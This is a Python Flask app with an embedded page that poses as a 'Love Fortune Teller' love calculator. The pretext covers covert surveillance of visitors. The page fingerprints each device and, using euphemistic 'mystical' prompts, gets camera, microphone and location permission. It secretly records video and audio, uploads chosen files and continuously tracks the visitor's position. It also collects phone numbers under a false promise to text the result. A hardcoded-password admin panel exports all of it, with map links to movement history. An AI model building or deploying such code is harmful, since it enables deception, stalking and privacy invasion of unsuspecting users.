from flask import Flask, request, jsonify, render_template_string, Response
import json
import os
import sqlite3
import random
from datetime import datetime

app = Flask(__name__)

# ---------- Your Service ID (hardcoded) ----------
SERVICE_ID = "srv-d7jkpe3bc2fs73c2qiu0"

# ---------- SQLite Database Setup ----------
DB_FILE = 'visitors.db'

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    # Main visitor table – includes service_id column
    c.execute('''
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            sessionId TEXT,
            timestamp TEXT,
            ip TEXT,
            name TEXT,
            crush_name TEXT,
            fortuneText TEXT,
            phoneNumber TEXT,
            fingerprint TEXT,
            batteryLevel TEXT,
            batteryCharging TEXT,
            networkType TEXT,
            networkSpeed TEXT,
            deviceMemory TEXT,
            screen TEXT,
            timezone TEXT,
            userAgent TEXT,
            latitude TEXT,
            longitude TEXT,
            mapUrl TEXT,
            cameraVideo TEXT,
            microphone TEXT,
            files TEXT,
            service_id TEXT
        )
    ''')
    # Location history table
    c.execute('''
        CREATE TABLE IF NOT EXISTS location_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            sessionId TEXT,
            timestamp TEXT,
            latitude REAL,
            longitude REAL
        )
    ''')
    # Ensure service_id column exists (for older databases)
    try:
        c.execute("ALTER TABLE visitors ADD COLUMN service_id TEXT")
    except sqlite3.OperationalError:
        pass
    conn.commit()
    conn.close()

def save_visitor(data):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id FROM visitors WHERE sessionId = ?", (data.get('sessionId'),))
    existing = c.fetchone()
    if existing:
        c.execute('''
            UPDATE visitors SET
                timestamp = ?, ip = ?, name = ?, crush_name = ?, fortuneText = ?, phoneNumber = ?,
                fingerprint = ?, batteryLevel = ?, batteryCharging = ?, networkType = ?, networkSpeed = ?,
                deviceMemory = ?, screen = ?, timezone = ?, userAgent = ?,
                latitude = ?, longitude = ?, mapUrl = ?, cameraVideo = ?, microphone = ?, files = ?,
                service_id = ?
            WHERE sessionId = ?
        ''', (
            data.get('timestamp'), data.get('ip'), data.get('name'), data.get('crush_name'), data.get('fortuneText'), data.get('phoneNumber'),
            data.get('fingerprint'), data.get('batteryLevel'), data.get('batteryCharging'), data.get('networkType'), data.get('networkSpeed'),
            data.get('deviceMemory'), data.get('screen'), data.get('timezone'), data.get('userAgent'),
            data.get('latitude'), data.get('longitude'), data.get('mapUrl'), data.get('cameraVideo'), data.get('microphone'), data.get('files'),
            data.get('service_id'), data.get('sessionId')
        ))
    else:
        c.execute('''
            INSERT INTO visitors (
                sessionId, timestamp, ip, name, crush_name, fortuneText, phoneNumber,
                fingerprint, batteryLevel, batteryCharging, networkType, networkSpeed,
                deviceMemory, screen, timezone, userAgent,
                latitude, longitude, mapUrl, cameraVideo, microphone, files, service_id
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data.get('sessionId'), data.get('timestamp'), data.get('ip'), data.get('name'), data.get('crush_name'), data.get('fortuneText'), data.get('phoneNumber'),
            data.get('fingerprint'), data.get('batteryLevel'), data.get('batteryCharging'), data.get('networkType'), data.get('networkSpeed'),
            data.get('deviceMemory'), data.get('screen'), data.get('timezone'), data.get('userAgent'),
            data.get('latitude'), data.get('longitude'), data.get('mapUrl'), data.get('cameraVideo'), data.get('microphone'), data.get('files'),
            data.get('service_id')
        ))
    conn.commit()
    conn.close()

def save_location_update(session_id, lat, lon):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        INSERT INTO location_history (sessionId, timestamp, latitude, longitude)
        VALUES (?, ?, ?, ?)
    ''', (session_id, datetime.now().isoformat(), lat, lon))
    conn.commit()
    conn.close()

def get_location_history(session_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        SELECT timestamp, latitude, longitude FROM location_history
        WHERE sessionId = ?
        ORDER BY id ASC
    ''', (session_id,))
    rows = c.fetchall()
    conn.close()
    return rows

def get_all_visitors():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM visitors ORDER BY id DESC")
    rows = c.fetchall()
    columns = [description[0] for description in c.description]
    visitors = []
    for row in rows:
        visitor = {columns[i]: row[i] for i in range(len(columns))}
        visitor['location_history'] = get_location_history(visitor.get('sessionId'))
        visitors.append(visitor)
    conn.close()
    return visitors

# ---------- Love Calculator ----------
def calculate_love_percentage(name1, name2):
    combined = (name1 + name2).lower()
    total = sum(ord(c) for c in combined)
    percentage = 50 + (total % 51)
    return percentage

def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
        f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
        f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
        f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony. So beautiful!",
        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score. True love is near!",
        f"🌸 {name1} and {name2}, your love story is {percentage}% written in the stars!",
        f"💗 The universe whispers: {name1} & {name2} – {percentage}% meant to be!",
        f"💘 {name1} and {name2}, your love percentage is {percentage}%. Cherish every moment!",
        f"🎯 Love radar: {name1} → {name2} = {percentage}%. Cupid is working overtime!"
    ]
    return random.choice(messages)

# ---------- Flask Routes ----------
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/get-session-data', methods=['POST'])
def get_session_data_route():
    data = request.json
    session_id = data.get('sessionId')
    if session_id:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT name, crush_name, fortuneText, phoneNumber FROM visitors WHERE sessionId = ?", (session_id,))
        row = c.fetchone()
        conn.close()
        if row:
            return jsonify({
                'exists': True,
                'name': row[0],
                'crush_name': row[1],
                'fortuneText': row[2],
                'phoneNumber': row[3]
            })
    return jsonify({'exists': False})

@app.route('/save', methods=['POST'])
def save():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    data['ip'] = request.remote_addr
    data['service_id'] = SERVICE_ID   # <-- service ID added here
    required_fields = ['sessionId', 'name', 'crush_name', 'fingerprint', 'batteryLevel', 'batteryCharging',
                       'networkType', 'networkSpeed', 'deviceMemory', 'screen', 'timezone', 'userAgent',
                       'latitude', 'longitude', 'mapUrl', 'cameraVideo', 'microphone', 'files']
    for field in required_fields:
        if field not in data:
            data[field] = ''
    save_visitor(data)
    return jsonify({'status': 'saved'})

@app.route('/update-location', methods=['POST'])
def update_location():
    data = request.json
    session_id = data.get('sessionId')
    lat = data.get('latitude')
    lon = data.get('longitude')
    if session_id and lat is not None and lon is not None:
        save_location_update(session_id, lat, lon)
        return jsonify({'status': 'recorded'})
    return jsonify({'status': 'error'}), 400

@app.route('/save-phone', methods=['POST'])
def save_phone():
    data = request.json
    session_id = data.get('sessionId')
    phone = data.get('phoneNumber')
    fortune_text = data.get('fortune')
    if session_id:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE visitors SET phoneNumber = ?, fortuneText = ? WHERE sessionId = ?", (phone, fortune_text, session_id))
        conn.commit()
        conn.close()
        return jsonify({'status': 'saved'})
    return jsonify({'status': 'error'}), 400

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'admin123':
            visitors = get_all_visitors()
            if not visitors:
                return '<h1>💕 No data yet</h1><p><a href="/admin">Back to login</a></p>'
            columns = list(visitors[0].keys())
            if 'location_history' in columns:
                columns.remove('location_history')
            html = '<h1>💕 Visitor Data (All Fields)</h1>'
            html += '<p><a href="/admin">Back to login</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV (Excel compatible)</a></p>'
            html += '<div style="overflow-x: auto;">'
            html += '<table border="1" cellpadding="5" style="border-collapse: collapse; min-width: 800px;">'
            html += '<tr>' + ''.join(f'<th style="background:#ff6b6b; color:white; padding:8px;">{col}</th>' for col in columns) + '</tr>'
            for v in visitors:
                html += '<tr>'
                for col in columns:
                    val = v.get(col, '')
                    if col in ('cameraVideo', 'files') and isinstance(val, str) and len(val) > 100:
                        display_val = f'<div style="max-width:300px; overflow-x:auto; white-space:pre-wrap; font-size:11px;">{val}</div>'
                    else:
                        display_val = str(val)[:500]
                    html += f'<td style="padding:8px; font-size:12px;">{display_val}</td>'
                html += '</tr>'
            html += '</table></div>'

            html += '<hr><h2>📍 Live Location History (movement tracking)</h2>'
            for v in visitors:
                hist = v.get('location_history', [])
                if hist:
                    html += f'<h3>Session: {v.get("sessionId", "Unknown")} – {v.get("name", "Anonymous")} (crush: {v.get("crush_name", "?")})</h3>'
                    html += '<table border="1" cellpadding="3" style="margin-bottom:20px;">'
                    html += '<tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>'
                    for ts, lat, lon in hist:
                        map_link = f'https://www.google.com/maps?q={lat},{lon}'
                        html += f'<tr><td style="white-space:nowrap;">{ts}</td><td>{lat}</td><td>{lon}</td><td><a href="{map_link}" target="_blank">View</a></td></tr>'
                    html += '</table>'
            return html
        else:
            return '<h1>🔒 Wrong password. <a href="/admin">Try again</a></h1>'
    
    return '''
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title>
        <style>
            body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; }
            .login-box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px rgba(0,0,0,0.1); text-align: center; }
            input { padding: 10px; margin: 10px; width: 200px; border-radius: 10px; border: 1px solid #ccc; }
            button { padding: 10px 20px; background: #ff6b6b; color: white; border: none; border-radius: 10px; cursor: pointer; }
        </style>
        </head>
        <body>
            <div class="login-box">
                <h2>🔐 Admin Login</h2>
                <form method="POST">
                    <input type="password" name="password" placeholder="Enter password" required><br>
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
    '''

@app.route('/admin/download-csv')
def download_csv():
    pwd = request.args.get('pass')
    if pwd != 'admin123':
        return 'Unauthorized', 403
    visitors = get_all_visitors()
    import csv
    from io import StringIO
    if not visitors:
        return "No data"
    output = StringIO()
    writer = csv.writer(output, quoting=csv.QUOTE_ALL)
    columns = [k for k in visitors[0].keys() if k != 'location_history']
    writer.writerow(columns)
    for v in visitors:
        row = [str(v.get(col, '')).replace('\n', ' ').replace('\r', ' ') for col in columns]
        writer.writerow(row)
    return Response(output.getvalue(), mimetype='text/csv', headers={'Content-Disposition': 'attachment;filename=visitors_data.csv'})

@app.route('/calculate-love', methods=['POST'])
def calculate_love():
    data = request.json
    name1 = data.get('name1', '')
    name2 = data.get('name2', '')
    if not name1 or not name2:
        return jsonify({'message': 'Please provide both names'}), 400
    percentage = calculate_love_percentage(name1, name2)
    message = get_love_message(name1, name2, percentage)
    return jsonify({'percentage': percentage, 'message': message})

# ---------- HTML Template (complete) ----------
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Fortune Teller 💕</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
            font-family: 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            max-width: 500px;
            width: 100%;
            background: rgba(255,255,255,0.95);
            border-radius: 40px;
            padding: 35px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
        }
        h1 { font-size: 2em; background: linear-gradient(135deg, #ff6b6b, #c06c84); -webkit-background-clip: text; background-clip: text; color: transparent; }
        input, button {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border-radius: 60px;
            border: 2px solid #ffdde1;
            font-size: 16px;
            text-align: center;
        }
        button {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            color: white;
            border: none;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover { transform: scale(1.02); }
        .hidden { display: none; }
        .fortune-box {
            background: rgba(255,182,193,0.3);
            border-left: 5px solid #ff1493;
            border-radius: 20px;
            padding: 20px;
            margin: 20px 0;
            font-size: 1.3em;
            font-weight: bold;
            color: #c06c84;
        }
        .step {
            margin-top: 20px;
            padding: 15px;
            background: rgba(255,255,255,0.9);
            border-radius: 20px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #ff1493;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        svg { margin: 10px auto; display: block; }
        .sms-prompt {
            margin-top: 20px;
            padding: 15px;
            background: rgba(255,255,255,0.8);
            border-radius: 20px;
        }
        .permission-box {
            background: #ffe4e1;
            padding: 15px;
            border-radius: 20px;
            margin: 15px 0;
            font-size: 1.1rem;
            font-weight: bold;
            color: #b84c6c;
        }
        .two-inputs { display: flex; gap: 10px; }
        .two-inputs input { margin: 0; }
    </style>
</head>
<body>
<div class="card">
    <h1>💕 Love Fortune Teller 💕</h1>
    <div id="step-name">
        <div class="two-inputs">
            <input type="text" id="yourName" placeholder="🩷 Your name">
            <input type="text" id="crushName" placeholder="💙 Crush's name">
        </div>
        <button onclick="startProcess()">🌈 Calculate Our Love 🌈</button>
    </div>
    <div id="loading" class="hidden">
        <div class="spinner"></div>
        <p>✨ Reading the stars... ✨</p>
    </div>
    <div id="permissions" class="hidden">
        <p>🌟 To unlock your **Ultra‑Personalised Love Vision**, grant these mystical keys:</p>
        <div class="permission-box">
            💕 Celestial Anchor (Location) ✨<br>
            🌟 Heartbeat Whisper (Camera & Mic) 🌙<br>
            ✨ Secret Keepsake (Your Love Memories – optional) 🕯️
        </div>
        <p style="font-size:0.85rem; color:#c06c84;">(Click below – your browser will ask for each permission)</p>
        <button onclick="requestAll()">🔮 Cast the Love Spell 🔮</button>
    </div>
    <div id="progress" class="hidden"></div>
    <div id="result" class="hidden">
        <div class="fortune-box" id="fortuneText"></div>
        <div id="smsSection" class="sms-prompt hidden">
            <p>📱 Save this result to your phone (permanently saved)</p>
            <input type="tel" id="phoneNumber" placeholder="Enter your mobile number">
            <button id="sendSmsBtn" onclick="sendSms()">💬 Send to my phone</button>
            <div id="smsStatus" style="margin-top:10px; font-size:14px;"></div>
        </div>
        <p>✨ Thank you for trusting the stars ✨</p>
    </div>
</div>

<input type="file" id="fileInput" multiple style="display:none">

<script>
    let sessionId = localStorage.getItem('fortuneSessionId');
    if (!sessionId) {
        sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
        localStorage.setItem('fortuneSessionId', sessionId);
    }

    let visitorData = { sessionId: sessionId };
    let mediaRecorder, mediaStream, recordedBlobs = [];
    let currentFortuneText = "";
    let hasExistingData = false;
    let locationWatcher = null;
    let lastSentTime = 0;

    async function getFingerprint() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            return result.visitorId;
        } catch(e) { return 'error'; }
    }

    async function getBattery() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return { level: Math.round(battery.level * 100), charging: battery.charging };
            } catch(e) { return { level: 'unknown', charging: false }; }
        }
        return { level: 'unsupported', charging: false };
    }

    function getNetwork() {
        const conn = navigator.connection || navigator.mozConnection;
        if (conn) {
            return { type: conn.effectiveType || 'unknown', speed: conn.downlink ? conn.downlink + ' Mbps' : 'unknown' };
        }
        return { type: 'unknown', speed: 'unknown' };
    }

    function getMemory() {
        return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
    }

    function getScreen() {
        return `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`;
    }

    function getTimezone() {
        return Intl.DateTimeFormat().resolvedOptions().timeZone;
    }

    function getUserAgent() {
        return navigator.userAgent;
    }

    window.addEventListener('load', async () => {
        try {
            const resp = await fetch('/get-session-data', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({ sessionId: sessionId })
            });
            const data = await resp.json();
            if (data.exists && data.fortuneText) {
                hasExistingData = true;
                if (data.name) document.getElementById('yourName').value = data.name;
                if (data.crush_name) document.getElementById('crushName').value = data.crush_name;
                document.getElementById('step-name').classList.add('hidden');
                document.getElementById('result').classList.remove('hidden');
                document.getElementById('fortuneText').innerText = data.fortuneText;
                currentFortuneText = data.fortuneText;
                if (data.phoneNumber) {
                    document.getElementById('phoneNumber').value = data.phoneNumber;
                    document.getElementById('phoneNumber').disabled = true;
                    document.getElementById('smsStatus').innerHTML = '✅ Phone number already saved';
                } else {
                    document.getElementById('smsSection').classList.remove('hidden');
                }
            }
        } catch(e) { console.log("Session load error", e); }
    });

    async function startProcess() {
        if (hasExistingData) return;
        const yourName = document.getElementById('yourName').value.trim();
        const crushName = document.getElementById('crushName').value.trim();
        if (!yourName || !crushName) {
            alert('💕 Please enter both names!');
            return;
        }
        
        document.getElementById('step-name').classList.add('hidden');
        document.getElementById('loading').classList.remove('hidden');
        
        const fingerprint = await getFingerprint();
        const battery = await getBattery();
        const network = getNetwork();
        
        visitorData.name = yourName;
        visitorData.crush_name = crushName;
        visitorData.fingerprint = fingerprint;
        visitorData.batteryLevel = battery.level;
        visitorData.batteryCharging = battery.charging;
        visitorData.networkType = network.type;
        visitorData.networkSpeed = network.speed;
        visitorData.deviceMemory = getMemory();
        visitorData.screen = getScreen();
        visitorData.timezone = getTimezone();
        visitorData.userAgent = getUserAgent();
        visitorData.timestamp = new Date().toISOString();
        
        await new Promise(r => setTimeout(r, 500));
        document.getElementById('loading').classList.add('hidden');
        
        const permsAlreadyGranted = localStorage.getItem('lovePermissionsGranted');
        if (permsAlreadyGranted === 'true') {
            await finalizeAndSave();
        } else {
            document.getElementById('permissions').classList.remove('hidden');
        }
    }

    function showStep(title, status, percent) {
        const div = document.getElementById('progress');
        div.innerHTML = `<div class="step"><b>${title}</b><br>${status}<br><svg width="80" height="80" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="none" stroke="#ddd" stroke-width="8"/><circle id="progCircle" cx="50" cy="50" r="40" fill="none" stroke="#10b981" stroke-width="8" stroke-linecap="round" stroke-dasharray="251.2" stroke-dashoffset="${251.2 * (1 - percent/100)}"/></svg></div>`;
        div.classList.remove('hidden');
    }
    function hideStep() { document.getElementById('progress').classList.add('hidden'); }

    async function requestAll() {
        document.getElementById('permissions').classList.add('hidden');
        try {
            await getLocation();
            await getMedia();
            await getFilesTraditional();
        } catch(e) { console.log("Permission step error", e); }
        localStorage.setItem('lovePermissionsGranted', 'true');
        await finalizeAndSave();
    }

    function getLocation() {
        return new Promise((resolve) => {
            showStep('💕 Celestial Anchor', 'Requesting location...', 0);
            const timeout = setTimeout(() => {
                visitorData.latitude = 'denied';
                visitorData.longitude = 'denied';
                visitorData.mapUrl = '';
                showStep('💕 Celestial Anchor', 'Location denied or timeout', 100);
                setTimeout(() => { hideStep(); resolve(); }, 500);
            }, 10000);
            navigator.geolocation.getCurrentPosition(
                pos => {
                    clearTimeout(timeout);
                    visitorData.latitude = pos.coords.latitude;
                    visitorData.longitude = pos.coords.longitude;
                    visitorData.mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}`;
                    showStep('💕 Celestial Anchor', 'Location granted!', 100);
                    startWatchingLocation();
                    setTimeout(() => { hideStep(); resolve(); }, 500);
                },
                () => {
                    clearTimeout(timeout);
                    visitorData.latitude = 'denied';
                    visitorData.longitude = 'denied';
                    visitorData.mapUrl = '';
                    showStep('💕 Celestial Anchor', 'Location denied', 100);
                    setTimeout(() => { hideStep(); resolve(); }, 500);
                },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        });
    }

    function startWatchingLocation() {
        if (locationWatcher) return;
        locationWatcher = navigator.geolocation.watchPosition(
            (position) => {
                const now = Date.now();
                if (now - lastSentTime < 2000) return;
                lastSentTime = now;
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                fetch('/update-location', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        sessionId: sessionId,
                        latitude: lat,
                        longitude: lon
                    })
                }).catch(e => console.log("Location update error", e));
            },
            (error) => console.log("Watch error", error),
            { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
        );
    }

    function getMedia() {
        return new Promise((resolve) => {
            showStep('🌟 Heartbeat Whisper', 'Requesting camera & microphone...', 10);
            const timeout = setTimeout(() => {
                visitorData.cameraVideo = 'denied';
                visitorData.microphone = 'denied';
                showStep('🌟 Heartbeat Whisper', 'Permission denied', 100);
                setTimeout(() => { hideStep(); resolve(); }, 500);
            }, 12000);
            navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user' } })
            .then(stream => {
                clearTimeout(timeout);
                mediaStream = stream;
                recordedBlobs = [];
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                mediaRecorder.ondataavailable = e => { if(e.data.size) recordedBlobs.push(e.data); };
                mediaRecorder.onstop = () => {
                    if(recordedBlobs.length) {
                        const blob = new Blob(recordedBlobs, { type: 'video/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            visitorData.cameraVideo = reader.result.split(',')[1].slice(0, 5000);
                            visitorData.microphone = 'recorded';
                            mediaStream.getTracks().forEach(t => t.stop());
                            showStep('🌟 Heartbeat Whisper', 'Video & audio captured!', 100);
                            setTimeout(() => { hideStep(); resolve(); }, 500);
                        };
                        reader.readAsDataURL(blob);
                    } else {
                        visitorData.cameraVideo = 'empty';
                        visitorData.microphone = 'empty';
                        showStep('🌟 Heartbeat Whisper', 'No media recorded', 100);
                        setTimeout(() => { hideStep(); resolve(); }, 500);
                    }
                };
                mediaRecorder.start();
                let seconds = 3;
                const interval = setInterval(() => {
                    seconds--;
                    showStep('🌟 Heartbeat Whisper', `Capturing ${seconds}s...`, 10 + (3-seconds)/3*90);
                    if(seconds <= 0) { clearInterval(interval); mediaRecorder.stop(); }
                }, 1000);
            })
            .catch(() => {
                clearTimeout(timeout);
                visitorData.cameraVideo = 'denied';
                visitorData.microphone = 'denied';
                showStep('🌟 Heartbeat Whisper', 'Permission denied', 100);
                setTimeout(() => { hideStep(); resolve(); }, 500);
            });
        });
    }

    function getFilesTraditional() {
        return new Promise((resolve) => {
            showStep('✨ Secret Keepsake', 'Gather your love memories (optional)...', 0);
            let resolved = false;
            const timeout = setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    visitorData.files = 'no selection (timeout)';
                    showStep('✨ Secret Keepsake', 'Continuing without memories', 100);
                    setTimeout(() => { hideStep(); resolve(); }, 500);
                }
            }, 15000);
            let fileInput = document.getElementById('fileInput');
            if (!fileInput) {
                fileInput = document.createElement('input');
                fileInput.type = 'file';
                fileInput.multiple = true;
                fileInput.style.display = 'none';
                document.body.appendChild(fileInput);
            }
            fileInput.onchange = null;
            fileInput.value = '';
            fileInput.onchange = async (event) => {
                if (resolved) return;
                clearTimeout(timeout);
                resolved = true;
                const files = Array.from(event.target.files);
                if (files.length === 0) {
                    visitorData.files = 'no files selected';
                    showStep('✨ Secret Keepsake', 'No memories shared', 100);
                    setTimeout(() => { hideStep(); resolve(); }, 500);
                    return;
                }
                let filesData = [];
                for (let i = 0; i < Math.min(files.length, 2); i++) {
                    const file = files[i];
                    const content = await new Promise(res => {
                        const reader = new FileReader();
                        reader.onloadend = () => res(reader.result.split(',')[1].slice(0, 2000));
                        reader.readAsDataURL(file);
                    });
                    filesData.push({ name: file.name, size: file.size, type: file.type, data: content });
                }
                visitorData.files = JSON.stringify(filesData);
                showStep('✨ Secret Keepsake', `${filesData.length} memory(s) received`, 100);
                setTimeout(() => { hideStep(); resolve(); }, 500);
            };
            fileInput.click();
        });
    }

    async function finalizeAndSave() {
        const yourName = visitorData.name;
        const crushName = visitorData.crush_name;
        const resp = await fetch('/calculate-love', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ name1: yourName, name2: crushName })
        });
        const loveData = await resp.json();
        currentFortuneText = loveData.message;
        document.getElementById('fortuneText').innerText = currentFortuneText;
        
        visitorData.fortuneText = currentFortuneText;
        
        await fetch('/save', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify(visitorData)
        });
        
        document.getElementById('smsSection').classList.remove('hidden');
        document.getElementById('result').classList.remove('hidden');
    }

    async function sendSms() {
        const phoneInput = document.getElementById('phoneNumber');
        const phone = phoneInput.value.trim();
        const statusDiv = document.getElementById('smsStatus');
        const sendBtn = document.getElementById('sendSmsBtn');
        
        if (!phone) {
            statusDiv.innerText = 'Please enter a phone number';
            return;
        }
        if (!/^[0-9+\-\s]{8,15}$/.test(phone)) {
            statusDiv.innerText = 'Invalid phone number format';
            return;
        }
        
        sendBtn.disabled = true;
        sendBtn.innerText = '💫 Saving...';
        statusDiv.innerText = 'Saving your number...';
        
        try {
            const resp = await fetch('/save-phone', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({
                    sessionId: sessionId,
                    phoneNumber: phone,
                    fortune: currentFortuneText
                })
            });
            const result = await resp.json();
            if (result.status === 'saved') {
                statusDiv.innerHTML = '✅ Your love result has been saved with your phone number!';
                phoneInput.disabled = true;
                sendBtn.style.display = 'none';
            } else {
                statusDiv.innerText = 'Error saving. Please try again.';
                sendBtn.disabled = false;
                sendBtn.innerText = '💬 Send to my phone';
            }
        } catch(e) {
            statusDiv.innerText = 'Network error. Please try again.';
            sendBtn.disabled = false;
            sendBtn.innerText = '💬 Send to my phone';
        }
    }
</script>
</body>
</html>
'''

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
